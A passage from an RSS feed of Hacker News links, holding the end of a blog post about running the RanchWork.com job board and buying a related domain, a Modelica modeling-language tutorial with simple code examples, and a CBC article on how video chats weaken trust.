<p>Then, over the next 7 years, site traffic did this:</p>
<p><img src="https://www.deepsouthventures.com/wp-content/uploads/ranchwork-traffic-stats.png" alt="" width="700" height="158" srcset="https://www.deepsouthventures.com/wp-content/uploads/ranchwork-traffic-stats.png 700w, https://www.deepsouthventures.com/wp-content/uploads/ranchwork-traffic-stats-300x68.png 300w" sizes="(max-width: 700px) 100vw, 700px"></p>
<p>From virtually zero traffic, the site ramped up to roughly 40k-50k visitors a month. Typically 200,000 pageviews every 30 days. I had to start managing overage fees with my hosting provider.</p>
<p>Jobs of all types started pouring in. </p>
<p>As the sole curator, I made sure they followed the singular track I defined. And overall, they did.</p>
<p>Jobs like this, where you <a href="https://www.ranchwork.com/job/packers-trail-guides-maintenance-crew-needed-at-grand-canyon-az/" rel="noopener noreferrer" target="_blank">had to ride a mule to &amp; from your work location</a> at the Grand Canyon.</p>
<p>Or this one, for a <a href="https://www.ranchwork.com/job/mountain-permit-rider-needed-at-wyoming-cattle-ranch/" rel="noopener noreferrer" target="_blank">Mountain Permit Rider</a>, responsible for all for all aspects of yearling cattle care &amp; management in private ranch pastures and mountain forest grazing allotments near Cody, Wyoming. </p>
<p>Or this Job Wanted from 2017, an <a href="https://www.ranchwork.com/job/position-wanted-ranch-hand-91817/" rel="noopener noreferrer" target="_blank">individual looking for work in the Cave Creek / Scottsdale, Arizona area</a>.</p>
<p>Job posting pictures were equally as endearing. All user submitted. Pics like this:</p>
<p><img src="https://www.deepsouthventures.com/wp-content/uploads/ranchwork-photo-1-700x350.jpg" alt="" width="700" height="350" srcset="https://www.deepsouthventures.com/wp-content/uploads/ranchwork-photo-1-700x350.jpg 700w, https://www.deepsouthventures.com/wp-content/uploads/ranchwork-photo-1-300x150.jpg 300w, https://www.deepsouthventures.com/wp-content/uploads/ranchwork-photo-1.jpg 1240w" sizes="(max-width: 700px) 100vw, 700px"></p>
<p>and this:</p>
<p><img src="https://www.deepsouthventures.com/wp-content/uploads/ranchwork-photo-2-700x325.jpg" alt="" width="700" height="325" srcset="https://www.deepsouthventures.com/wp-content/uploads/ranchwork-photo-2-700x325.jpg 700w, https://www.deepsouthventures.com/wp-content/uploads/ranchwork-photo-2-300x139.jpg 300w, https://www.deepsouthventures.com/wp-content/uploads/ranchwork-photo-2-1536x714.jpg 1536w, https://www.deepsouthventures.com/wp-content/uploads/ranchwork-photo-2.jpg 1835w" sizes="(max-width: 700px) 100vw, 700px"></p>
<p>and all these:</p>
<p><img src="https://www.deepsouthventures.com/wp-content/uploads/ranchwork-photo-3-700x525.jpg" alt="" width="700" height="525" srcset="https://www.deepsouthventures.com/wp-content/uploads/ranchwork-photo-3-700x525.jpg 700w, https://www.deepsouthventures.com/wp-content/uploads/ranchwork-photo-3-300x225.jpg 300w, https://www.deepsouthventures.com/wp-content/uploads/ranchwork-photo-3.jpg 1024w" sizes="(max-width: 700px) 100vw, 700px"></p>
<p><img src="https://www.deepsouthventures.com/wp-content/uploads/ranchwork-photo-4-700x467.jpg" alt="" width="700" height="467" srcset="https://www.deepsouthventures.com/wp-content/uploads/ranchwork-photo-4-700x467.jpg 700w, https://www.deepsouthventures.com/wp-content/uploads/ranchwork-photo-4-300x200.jpg 300w, https://www.deepsouthventures.com/wp-content/uploads/ranchwork-photo-4.jpg 1400w" sizes="(max-width: 700px) 100vw, 700px"></p>
<p><img src="https://www.deepsouthventures.com/wp-content/uploads/ranchwork-photo-5-700x526.jpg" alt="" width="700" height="526" srcset="https://www.deepsouthventures.com/wp-content/uploads/ranchwork-photo-5-700x526.jpg 700w, https://www.deepsouthventures.com/wp-content/uploads/ranchwork-photo-5-300x226.jpg 300w, https://www.deepsouthventures.com/wp-content/uploads/ranchwork-photo-5.jpg 1165w" sizes="(max-width: 700px) 100vw, 700px"></p>
<p><img src="https://www.deepsouthventures.com/wp-content/uploads/ranchwork-photo-6-700x467.jpg" alt="" width="700" height="467" srcset="https://www.deepsouthventures.com/wp-content/uploads/ranchwork-photo-6-700x467.jpg 700w, https://www.deepsouthventures.com/wp-content/uploads/ranchwork-photo-6-300x200.jpg 300w, https://www.deepsouthventures.com/wp-content/uploads/ranchwork-photo-6.jpg 1200w" sizes="(max-width: 700px) 100vw, 700px"></p>
<p><img src="https://www.deepsouthventures.com/wp-content/uploads/ranchwork-photo-7-700x394.jpg" alt="" width="700" height="394" srcset="https://www.deepsouthventures.com/wp-content/uploads/ranchwork-photo-7-700x394.jpg 700w, https://www.deepsouthventures.com/wp-content/uploads/ranchwork-photo-7-300x169.jpg 300w, https://www.deepsouthventures.com/wp-content/uploads/ranchwork-photo-7.jpg 1136w" sizes="(max-width: 700px) 100vw, 700px"></p>
<p><img src="https://www.deepsouthventures.com/wp-content/uploads/ranchwork-photo-8-700x587.jpg" alt="" width="700" height="587" srcset="https://www.deepsouthventures.com/wp-content/uploads/ranchwork-photo-8-700x587.jpg 700w, https://www.deepsouthventures.com/wp-content/uploads/ranchwork-photo-8-300x252.jpg 300w, https://www.deepsouthventures.com/wp-content/uploads/ranchwork-photo-8.jpg 800w" sizes="(max-width: 700px) 100vw, 700px"></p>
<p>And even that one at the beginning of the essay. (<em>nyeh, no need to scroll back up, here it is again</em>).</p>
<p><img src="https://www.deepsouthventures.com/wp-content/uploads/yellowstone-roughriders-3-725x532.jpg" alt="" width="700" height="514" srcset="https://www.deepsouthventures.com/wp-content/uploads/yellowstone-roughriders-3-725x532.jpg 725w, https://www.deepsouthventures.com/wp-content/uploads/yellowstone-roughriders-3-300x220.jpg 300w, https://www.deepsouthventures.com/wp-content/uploads/yellowstone-roughriders-3.jpg 750w" sizes="(max-width: 700px) 100vw, 700px"></p>
<p>The more jobs (and job wanted) postings we listed, the more positive feedback we’d receive. That we were a great help for a remote ranch with limited hiring resources. That they were in financial straits, and our Free offering allowed them to hire the right Manager to turn their operation around. <em>And the avenue I was most skeptical about</em> – Job Wanted postings – wound up assisting individuals who craved an escape from the city into life on a working ranch (as well as contributing 30% of our overall revenue). &gt;&gt; <em>gracias, Mr. Clapp</em></p>
<p>The feeling was familiar. It felt like my <a href="https://www.deepsouthventures.com/i-sell-onions-on-the-internet/" target="_blank" rel="noopener noreferrer">Vidalia</a> project. That I was making a positive impact. Satisfying a unique pain point, subtly, as a solo operator.</p>
<p>This project – originally a passing glance – became my mini workhorse. And such a proud production that I wound up buying the whole project from David in 2017. I doubled down in 2019 by investing $10k into a fancier backend and refreshed design. The site deserved that – a proper identity.</p>
<p><img src="https://www.deepsouthventures.com/wp-content/uploads/new-rw-700x552-min.png" alt="New RanchWork.com" width="700" height="552" srcset="https://www.deepsouthventures.com/wp-content/uploads/new-rw-700x552-min.png 700w, https://www.deepsouthventures.com/wp-content/uploads/new-rw-700x552-min-300x237.png 300w" sizes="(max-width: 700px) 100vw, 700px"></p>
<p>I tend to approach online businesses this way. Not intentionally – I just found myself on this path. Find a good domain name; build a product/service; see if it solves a problem &amp; makes people happy; <strong>*and only then*</strong> attempt to make it profitable. Purpose always comes first. As does contentment. Revenue always comes second. Sure, this approach has bitten me in the ass before, but I don’t care. When it’s worked, the results are wondrous. And this project checked those boxes.</p>
<p>And while RanchWork.com isn’t a flashy VC funded endeavor, or even some high flying 6-figure revenue generator, it’s not that I don’t care. The <em>site</em> doesn’t care. Cause it’s too busy. Working. Quietly. </p>
<p>My Twitter friend <a href="https://ian.is/" rel="noopener noreferrer" target="_blank">Ian Nuttall</a> identifies these types of projects aptly; as nice, <em>humble</em> internet businesses. </p>
<p>I like humble internet businesses … </p>
<p>… and I’m quite proud to be this job board’s proprietor.</p>
<blockquote>
<p lang="en" dir="ltr">Trying to design my life so it’s a lot like this picture </p>
<p>(borrowed from a job listing on RanchWork today) <a href="https://t.co/BcZUQnJygP">pic.twitter.com/BcZUQnJygP</a></p>
<p>— Peter Askew (@searchbound) <a href="https://twitter.com/searchbound/status/1266002208652496898?ref_src=twsrc%5Etfw">May 28, 2020</a></p></blockquote>

<hr>
<h2>post script</h2>
<p>I knew I was in a pickle. </p>
<p>While I owned and operated RanchWork.com, I didn’t own the .com name of this niche industry. That being <em>RanchJobs.com</em>. It was owned by a 3rd party, and undeveloped.</p>
<p>That didn’t sit well with me.</p>
<p>So in 2018, I reached out to the owner. I got lucky, in that – – he responded. We had mutual friends, so that helped. The email:</p>
<p><img src="https://www.deepsouthventures.com/wp-content/uploads/ranchjobsbuy-1.png" alt="" width="700" height="445" srcset="https://www.deepsouthventures.com/wp-content/uploads/ranchjobsbuy-1.png 700w, https://www.deepsouthventures.com/wp-content/uploads/ranchjobsbuy-1-300x191.png 300w" sizes="(max-width: 700px) 100vw, 700px"></p>
<p>He was aware of my RanchWork project, and the price point reflected that. And he wouldn’t go lower. I couldn’t wrap my head around the price, so I shelved it. </p>
<p>Until 2020, two years later. When COVID-19 hit. The financial world went sideways. I was a bit frazzled as well. This domain name bubbled up into my brain, though. That this might be an opportunity.</p>
<p>So I leveraged a 3rd party domain marketplace platform where I could remain somewhat anonymous. I submitted an offer of $2,500.</p>
<p>They countered at $9,999. </p>
<p>I didn’t respond.</p>
<p>A broker from the marketplace called. Nice guy. He probed like a domain broker should do. He asked if they got down to $5k, if it’d be a range we’d consider. I wasn’t sure.</p>
<p>They brought the $5k offer to the table. </p>
<p>I understood I was in a halo of time where this price could disappear as quickly as it appeared, so I went ahead &amp; accepted it.</p>
<p>I wanted that chess piece off the board, essentially. Another barrier to entry. </p>
<p>It’s fun to see how many times this domain is typed into a browser, though (238 times per month, tracked via re-direct). If I look at it from an advertising perspective, &amp; apply a $0.50 <a href="https://en.wikipedia.org/wiki/Pay-per-click" rel="noopener noreferrer" target="_blank">CPC</a> to each visit, this domain should pay for itself by 2023. 🤠</p>
<p>I’m so fortunate the internet exists.</p>
<p><iframe width="560" height="315" src="https://www.youtube.com/embed/zcrEWRLk3CE" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
<hr>
<p><span>Get an email when I post new stuff</span>:<br>
</p>
		</div></div>]]>
            </description>
            <link>https://www.deepsouthventures.com/must-ride-mule-to-from-work-location/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23690922</guid>
            <pubDate>Tue, 30 Jun 2020 15:18:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[All about Modelica: An equation-based language for modeling physical systems]]>
            </title>
            <description>
<![CDATA[
Score 187 | Comments 37 (<a href="https://news.ycombinator.com/item?id=23690788">thread link</a>) | @macro-b
<br/>
June 30, 2020 | https://marcobonvini.com/modelica/2020/06/29/all-about-modelica.html | <a href="https://web.archive.org/web/*/https://marcobonvini.com/modelica/2020/06/29/all-about-modelica.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div>
      <h2>All about Modelica</h2>
      <p>
	by <b>Marco Bonvini</b> on Monday June 29, 2020
      </p>
    <p>Early in my career, when ML and AI weren’t as cool, I fell in love with modeling and simulations.
As Joel Spolsky recently <a href="https://www.joelonsoftware.com/2020/06/18/hash-a-free-online-platform-for-modeling-the-world/">put it</a>,
sometimes you’re working on something that’s just too complicated to reason about with simple math, you can’t even begin to guess
how the inputs affect the outputs. In such cases, simulation models will help you understand better complex problems.<!--more--></p>

<p>While working with modeling and simulations, I discovered Modelica, a language for developing simulation models.
I worked <a href="https://marcobonvini.com/research">extensively</a> with Modelica, both during my Ph.D. as well as
in my first job at <a href="https://eta.lbl.gov/">Lawrence Berkeley National Laboratory</a>.
Modelica is a great tool for modeling <a href="https://en.wikipedia.org/wiki/Cyber-physical_system">cyber-physical systems</a>,
for example to study the fuel efficiency of an hybrid vehicle, or to evaluate the interactions between renewable energy sources
and the electrical grid.</p>

<p>In this post I will provide a general overview on Modelica, and I’ll showcase some of its main features.</p>

<h4 id="what-is-modelica">What is Modelica?</h4>

<p>Modelica, as the name suggests, is a modeling language.
Which type of models? Mathematical models.
Modelica does not focus on a particular application domain, and gives you the freedom
to model a variety of problems ranging from electro-mechanical systems for automotive
or aerospace applications, to financial models for banks.</p>

<p>You can use the language to create mathematical models using any combination of the
following formalisms</p>

<ul>
  <li>differential equations</li>
  <li>algebraic equations</li>
  <li>difference equations</li>
  <li>discrete event systems</li>
</ul>

<p>As you can imagine, this kind of flexibility makes it easier to tackle lots of
different and interesting engineering problems, including cyber-physical systems.
Typical examples of such systems are cars. Cars are characterized by mechanical components that interact
with electronics and hydraulic systems, all under the supervision of multiple control systems.
So if you want to know how a car is actually going to behave, you need to simulate the whole shebang.</p>

<p>Ignoring the interaction between components – a rookie mistake in the world of simulations –
would lead to a poor understanding of the system.</p>

<figure>
   <img src="https://marcobonvini.com/images/posts/hybrid-car-scheme.png" alt="A car, typical example of cyber-physical system.">
   <figcaption>
      A car, typical example of cyber-physical systems.
   </figcaption>
</figure>

<p>It’s not hard to find other examples of cyber-phyisical systems, they’re everywhere you look:</p>

<ul>
  <li>every private or public transportation vehicle – from airplanes to e-bikes</li>
  <li>the electrical grid that powers our houses</li>
  <li>data centers that process our data, etc.</li>
  <li>our homes, thanks to the increasing adoption of PV panels, batteries, EV cars, and IoT devices</li>
</ul>

<p>So, at this point you should be convinced that cyber-physical systems are a big part of
everyday life. Modelica allows engineers and scientists to model these systems accurately,
giving us a chance to improve their performance. <strong>This is why Modelica matters</strong>.</p>

<h4 id="modeling-the-real-world">Modeling the real world</h4>

<p>Ask any engineer, and they’ll tell you - “It’s tough to model the real world!”
Engineers perform a balancing act when they create models of complex
physical systems, building detailed simulations while at the same time struggling
against overwhelming complexity or irrelevant detail.</p>

<p>The Modelica modeling language has several features that make it the right choice for
modeling complex engineering systems. Modelica is not some abstract academic toy
disregarded by the modern industry.
In fact, in the last few years Modelica has been adopted by some of the world’s biggest
automotive companies – Audi, BMW, Daimler, Ford, Toyota, and VW. These companies
use Modelica to design energy efficient vehicles, improve air conditioning systems.
They Ferrari F1 team uses Modelica too for designing their racing cars!
And the automotive sector is just one of many that find this language effective.
The aerospace and energy industry are increasingly adopting Modelica, and the US Department
of Energy has been steadily investing in this technology for <a href="https://github.com/lbl-srg/modelica-buildings">modeling buildings</a>
and improving their energy efficiency.</p>

<h4 id="modelica---a-first-example">Modelica - A first example</h4>

<p>As described on the <a href="https://www.modelica.org/">Modelica association</a> website,
<em>Modelica is a non-proprietary, object-oriented, equation based language to conveniently model
complex physical systems including a variety of different aspects, including mechanical,
electrical, electronic, hydraulic, thermal, control, electric power or process-oriented subcomponents.</em></p>

<p>The following diagram shows the big picture behind any Modelica model</p>

<p><img src="https://marcobonvini.com/images/posts/modelica_toolchain.png" width="100%">
</p>


<p>The steps are the following:</p>

<ol>
  <li>an engineer/scientist writes a Modelica model that represents an idea as a series of equations,</li>
  <li>a Modelica tool analyzes the model and verifies its correctness – Does the model have the same number
 of variables and equations? Are there typos?</li>
  <li>the tool compiles the model and generates an executable</li>
  <li>run the executable to simulate the system and produce data.</li>
</ol>

<p>Before diving into some of Modelica’s core concepts let’s start with an example,
a kind of <strong>HelloWorld</strong> of differential equations. We’ll use the simplest
differential equation you can imagine</p>

<p>
$$ \frac{d \, x(t)}{dt} = -2 \, x(t) $$
</p>
<p>with initial condition \( x(t_0) = 5 \)</p>

<div>

<figure><pre><code data-lang="modelica"><span></span><span> 1 </span><span>model</span> <span>HelloWorld</span>  <span>"The simplest differential equation ever"</span>
<span> 2 </span>  <span>// Define variables and parameters here...</span>
<span> 3 </span>  <span>Real</span> <span>x</span>
<span> 4 </span>    <span>"The unknown variable"</span><span>;</span>
<span> 5 </span>  <span>constant</span> <span>Real</span> <span>a</span> <span>=</span> <span>-</span><span>2.0</span>
<span> 6 </span>    <span>"Constant that characterizes the model"</span><span>;</span>
<span> 7 </span>  <span>parameter</span> <span>Real</span> <span>x_start</span> <span>=</span> <span>5.0</span>
<span> 8 </span>    <span>"Initial value of the variable x"</span><span>;</span>
<span> 9 </span><span>initial</span> <span>equation</span>
<span>10 </span>  <span>// Define initial conditions here...</span>
<span>11 </span>  <span>x</span> <span>=</span> <span>x_start</span><span>;</span>
<span>12 </span><span>equation</span>
<span>13 </span>  <span>// Write the equations here...</span>
<span>14 </span>  <span>der</span><span>(</span><span>x</span><span>)</span> <span>=</span> <span>a</span><span>*</span><span>x</span><span>;</span>
<span>15 </span><span>end</span> <span>HelloWorld</span><span>;</span></code></pre></figure>

</div>


<p>The keyword <code>model</code> defines the beginning of a model named <strong>HelloWorld</strong>.
The model is divided in three sections: declarations, initializations and equations.
The model starts by declaring variables, constants and parameters. <strong>Variables</strong> represent
quantities that are expected to change over time. <strong>Constants</strong>, meanwhile, are fixed
quantities that will never change. And finally <strong>parameters</strong> are quantities
that do not change over time but may change between simulations.
In this case parameter <code>x_start</code>, constant <code>a</code> and variable <code>x</code> have the same type,
<code>Real</code> type meaning a floating point number.</p>

<p>The keywords <code>initial equation</code> introduce the second part of our model.
Here we define the initial conditions of the system, for example the value of <code>x</code> at
the beginning of our model’s simulation time.</p>

<p>The keyword <code>equation</code> introduces the third and final part of our program,
where we finally get down to writing the equations of the system.
In this case there is one variable <code>x</code> and one differential equation <code>der(x) = a*x</code>.</p>

<p>One important thing to note is the <code>der(...)</code> operator that indicates the
time derivative of the expression inside the brackets.
The ability to express derivatives in such a clean and concise way is very helpful
when dealing with mathematical models.</p>

<h3 id="modelicas-key-principles">Modelica’s key principles</h3>

<p>So we’ve completed a simple example to get familiar with Modelica. Now, let’s look at
some of its most interesting features. As I mentioned at the beginning of the post,
Modelica is an object-oriented equation-based modeling language.
What exactly do those words mean? Let’s have a look, keeping in the context of
mathematical modeling.</p>

<h4 id="equation-based-modeling">Equation-based modeling</h4>

<p>Computer programs are nothing but clever set of instructions to let a computer solve a particular
problem for us (If this sounds familiar, bear with me. I’m going to make a distinction between
assignments and equations that you might not be familiar with).
Let’s consider the following problem: <em>given two numbers compute their sum</em>.
The following code snippet shows a solution to the problem implemented in C</p>

<div>

<figure><pre><code data-lang="c"><span></span><span>int</span> <span>main</span><span>(</span><span>void</span><span>){</span>
  <span>int</span> <span>a</span><span>,</span> <span>b</span><span>,</span> <span>c</span><span>;</span>
  <span>a</span> <span>=</span> <span>4</span><span>;</span>
  <span>b</span> <span>=</span> <span>3</span><span>;</span>
  <span>c</span> <span>=</span> <span>a</span> <span>+</span> <span>b</span><span>;</span>
  <span>return</span> <span>0</span><span>;</span>
<span>}</span></code></pre></figure>

</div>


<p>What happens here when the program is executed is that the value 4 is inserted in the memory space
associated to variable <code>a</code>, the value 3 is inserted in the memory space
associated to variable <code>b</code> and then their sum is assigned to the memory space associated to variable <code>c</code>.</p>

<p>Given the initial problem, this program implements a particular solution to it. And, most of the
time when we write algorithms we are writing specific solutions to certain problems.
In this case the problem and its algorithmic solution were pretty straightforward!</p>

<p>Now here’s the kicker: when dealing with mathematical modeling the situation is quite different.
You typically start with a set of equations that describe the general understanding of the system
you want to model.</p>

<p>Then, you can collected data about that system, and feed it into those equations to start
generating some interesting answers to your questions. Often there are  multiple questions to answer,
so the model should be as general as possible so that it can be be easily manipulated to
answer all the questions.</p>

<p>Let’s get back to our problem: <em>given two numbers compute their sum</em>. The following
is an example of a Modelica model that solves it</p>

<div>

<figure><pre><code data-lang="modelica"><span></span><span>1 </span><span>model</span> <span>Sum</span>
<span>2 </span>   <span>Integer</span> <span>a</span><span>,</span> <span>b</span><span>,</span> <span>c</span><span>;</span>
<span>3 </span><span>equation</span>
<span>4 </span>   <span>c</span> <span>-</span> <span>(</span><span>a</span> <span>+</span> <span>b</span><span>)</span> <span>=</span> <span>0</span><span>;</span>
<span>5 </span>   <span>a</span> <span>=</span> <span>4</span><span>;</span>
<span>6 </span>   <span>b</span> <span>-</span> <span>3</span> <span>=</span> <span>0</span><span>;</span>
<span>7 </span><span>end</span> <span>Sum</span><span>;</span></code></pre></figure>

</div>


<p>The content of line 4 is the essence of equation-based modeling. It all boils
down to two concepts:</p>

<ul>
  <li><code>c - (a + b) = 0</code> is an equation and <strong>equations are not assignment</strong> like the ones we’re used to
 write in C, Java, Python, etc.</li>
  <li><code>a = 4</code> and <code>b - 3 = 0</code> are located on lines 5 and 6. Both lines come after
 the first equation, and because <strong>equations are not assignment, their order does not matter</strong>.
 The only thing that matters is that the model has the same number of variables and equations.</li>
</ul>

<p>So it turns out that equation-based modeling is all about writing equations with code. The Modelica tool
of choice will know how to symbolically analyze the model, extract equations, substitute variables
in equations, sort them and apply the proper numerical methods to find the solution.</p>

<h4 id="working-with-causality">Working with Causality</h4>

<p>The equation-based paradigm opens the door to an interesting concept called a-causality.</p>

<p>Before focusing on the meaning and implications of a-causality let’s have a look at an example …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://marcobonvini.com/modelica/2020/06/29/all-about-modelica.html">https://marcobonvini.com/modelica/2020/06/29/all-about-modelica.html</a></em></p>]]>
            </description>
            <link>https://marcobonvini.com/modelica/2020/06/29/all-about-modelica.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-23690788</guid>
            <pubDate>Tue, 30 Jun 2020 15:05:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Video chats short-circuit a brain function essential for trust?]]>
            </title>
            <description>
<![CDATA[
Score 111 | Comments 95 (<a href="https://news.ycombinator.com/item?id=23689614">thread link</a>) | @fraqed
<br/>
June 30, 2020 | https://www.cbc.ca/news/business/zoom-trust-business-pandemic-1.5628638?cmp=rss | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/business/zoom-trust-business-pandemic-1.5628638?cmp=rss">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Research shows essential cues of real life interaction from pheromones to body language just don’t work on video chats as the lockdown exhausts reserves of office sociability and excludes newbies.</p><div><figure><div><p><img alt="" srcset="" sizes="" src="https://i.cbc.ca/1.5628640.1593198689!/fileImage/httpImage/image.jpg_gen/derivatives/16x9_780/germany.jpg"></p></div><figcaption>Online video chats may look like the real thing but the lack of real-life contact short circuits a part of the brain essential for understanding non-verbal cues. And that's bad for business.<!-- --> <!-- -->(Thomas Peter/Reuters)</figcaption></figure><p><span><p>Ever get the sense there is something vital missing on those Zoom meetings? If so, you're not alone&nbsp;— and there is Canadian science to back you up.</p>  <p>As political and business leaders push to reopen the economy hoping to get restaurants, retailers and factories making money again, there may be good economic reasons for putting at least some of the work-from-home crowd back into the office as fast as it's safe to do so.</p>  <p>Canadian research on "computer-mediated communication," begun long before the current lockdown, shows video chat is an inadequate substitute for real-life interaction. The real thing, dependant&nbsp;on non-verbal cues, is extraordinarily more effective in creating rapport and getting ideas across.</p>  <p>Not only that, but the familiarity and trust we currently feel with coworkers during the lockdown's remote calls rests on connections remembered from back when we sat at a nearby desk or met for lunch.</p>  <h2>Bad for business</h2>  <p>As the lockdown stretches out and the mix of colleagues changes, it may be almost impossible to establish healthy trusting working relationships using remote video chat tools alone.</p>  <p>That's bad for business, said&nbsp;organizational behaviour specialist Mahdi Roghanizad from Ryerson University's Ted Rogers School of Business. The reason:&nbsp;getting a good reading on your fellow workers has been repeatedly shown to be essential for business efficiency, reaching common goals&nbsp;and establishing trust.</p>  <p><em><strong>WATCH | 'Zoom fatigue' is real and it's setting in:&nbsp;</strong></em></p>  <p><span><span><span></span><span>Many people are feeling drained because of an increase in video conferencing and psychologists have started describing it as “Zoom fatigue.”<!-- --> <!-- -->2:06</span></span></span></p>  <p>It is why teams <u><a href="https://www.cbc.ca/news/business/employment-remote-work-1.5269792" target="_blank">that worked remotely</a></u> even before the pandemic lockdown always met periodically in person. The latest research shows human-to-human bonding is like a kind of intuitive magic.</p>  <p>"Say you are seeing a person for the first time," explained Roghanizad. "After two&nbsp;to five&nbsp;minutes of interaction, you will have a better chance of a more accurate prediction about their cooperativeness or generosity. This is how our brain evolved."</p>  <p>The crucial point is that merely "seeing" the person is not enough.&nbsp;</p>  <p>"This ability goes away when the same interaction happens in video-to-video communication as is happening today through Zoom or Google Meet or Skype," explained Roghanizad, who started his career as an electrical engineer and has since used the tools of hard science to investigate the failures of computerized communication.</p>    <p>The scientist's interest began more than decade ago with&nbsp;research quoted in the Harvard Business Review that showed face-to-face communication was <u><a href="https://hbr.org/2017/04/a-face-to-face-request-is-34-times-more-successful-than-an-email" target="_blank">34 per cent more effective</a></u> than email in persuading people to donate to a good cause.</p>  <p>To those of us today with loaded electronic in-boxes, the results of that research may not be surprising. At the time, however,&nbsp;it was considered revolutionary because people in the study expected outcomes for email and personal contact to be about the same.</p>  <p>The results inspired Roghanizad and others to look into the reasons why person-to-person contact increased bonding and established a sense of trustworthiness.</p>  <h2>The smell of success</h2>  <p>Candidates included pheromones — the subtle fragrances we give off — plus a series of muted hand and body gestures such as crossing your arms and leaning back that in various combinations researchers have shown inspire confidence and "are predictive of economic behaviour," according to one <u><a href="http://robotic.media.mit.edu/wp-content/uploads/sites/7/2015/01/Desteno-etal-PS-12.pdf" target="_blank">research paper</a>.</u></p>  <p>Roghanizad's most recent research is helping to prove is that without real-life contact, those non-verbal cues simply don't register in a key interactive part of the human brain responsible for what scientists call "<u><a href="https://www.cbc.ca/player/play/2695977050" target="_blank">theory of mind</a></u>" —that creation of understanding between people working in groups.</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5628641.1593198711!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/health-coronavirus-belgium-restaurants.jpg 300w,https://i.cbc.ca/1.5628641.1593198711!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/health-coronavirus-belgium-restaurants.jpg 460w,https://i.cbc.ca/1.5628641.1593198711!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/health-coronavirus-belgium-restaurants.jpg 620w,https://i.cbc.ca/1.5628641.1593198711!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/health-coronavirus-belgium-restaurants.jpg 780w,https://i.cbc.ca/1.5628641.1593198711!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/health-coronavirus-belgium-restaurants.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5628641.1593198711!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/health-coronavirus-belgium-restaurants.jpg"></p></div><figcaption>A dog looks at Brussels Grand Place square as restaurants and bars reopen after the COVID-19 lockdown earlier this month. Even a pair of sunglasses can shut down a part of the brain responsible for generating the theory of mind essential to understanding your friends and co-workers.<!-- --> <!-- -->(Francois Lenoir/Reuters)</figcaption></figure></span></p>  <p>"Eye contact is required to activate that theory of mind and when the eye contact is not there, the whole other signal information is not processed by our brain," said Roghanizad.</p>  <p>His research has shown that even wearing sunglasses short circuits that portion of the brain and shuts the process down.</p>  <h2>'Multifaceted nature of the conversation'</h2>  <p>Frances Westley, author of the book <em><u><a href="https://www.goodreads.com/book/show/1341545.Getting_to_Maybe" target="_blank">Getting to Maybe</a></u></em> on how to influence those around us toward social change, said&nbsp;she has noticed a flatness in communication in her frequent video chats perhaps similar to having a conversation with an acquaintance who is wearing dark sunglasses.</p>  <p>"The quality of the interaction and the satisfaction of the interaction, even with people you know quite well, is definitely diminished," said Westley, a leader at the University of Waterloo's Institute for Social Innovation and Resilience.</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5546953.1588206597!/fileImage/httpImage/image.jpeg_gen/derivatives/original_300/zoom-parliament.jpeg 300w,https://i.cbc.ca/1.5546953.1588206597!/fileImage/httpImage/image.jpeg_gen/derivatives/original_460/zoom-parliament.jpeg 460w,https://i.cbc.ca/1.5546953.1588206597!/fileImage/httpImage/image.jpeg_gen/derivatives/original_620/zoom-parliament.jpeg 620w,https://i.cbc.ca/1.5546953.1588206597!/fileImage/httpImage/image.jpeg_gen/derivatives/original_780/zoom-parliament.jpeg 780w,https://i.cbc.ca/1.5546953.1588206597!/fileImage/httpImage/image.jpeg_gen/derivatives/original_1180/zoom-parliament.jpeg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5546953.1588206597!/fileImage/httpImage/image.jpeg_gen/derivatives/original_780/zoom-parliament.jpeg"></p></div><figcaption>Parliament meets using a video link. Critics say this form of online government makes it harder to trust politicians - and harder to figure out who is lying.<!-- --> <!-- -->(Michelle Rempel Garner/Twitter)</figcaption></figure></span></p>  <p>That may be one reason why people locked down in their own apartments are so anxious to get out and socialize, hungering for the primal brain-to-brain contact and empathy implied by the theory of mind. It may also be another reason for "<u><a href="https://www.cbc.ca/news/technology/zoom-fatigue-is-setting-in-1.5585933" target="_blank">Zoom fatigue</a></u>" as people struggle to find information that just isn't available on screen.</p>  <p>"The richness of the multifaceted nature of the conversation is deprived and because you are seeing the person you expect to have it," said Westley, who suggests people meet for a physically distanced walk or conversation to reach a more complete understanding.</p>  <p>Research from the world of criminology has shown the impression that video provides more information is spurious. Studies show the ability to recognize if someone's lying is actually <u><a href="https://www.hindawi.com/journals/jcrim/2013/164546/" target="_blank">deceived by video</a></u> and that you can make a better judgement from listening to audio alone or even by reading a transcript.</p>    <p>For those working from home, even if the video chat experience isn't as satisfying, dealing with colleagues you have worked with before allows you to use the vestiges of trust and familiarity developed during previous live interactions, said Roghanizad. Meeting new people in chats is entirely different, leaving confident collaboration seriously impaired.</p>  <p>As the lockdown stretches on, for hiring, for making deals, making new contacts or working with new staff or people in new positions, the lack of in-person communication&nbsp;will increasingly create barriers to effective business operations as institutions use up what is essentially a precious reserve of social capital.</p>  <p>This is one more reason that the work from home revolution caused by the pandemic may not be as long-lasting or as complete as some advocates have recently suggested.</p>  <p><em>Follow Don on Twitter <u><a href="https://twitter.com/don_pittis" 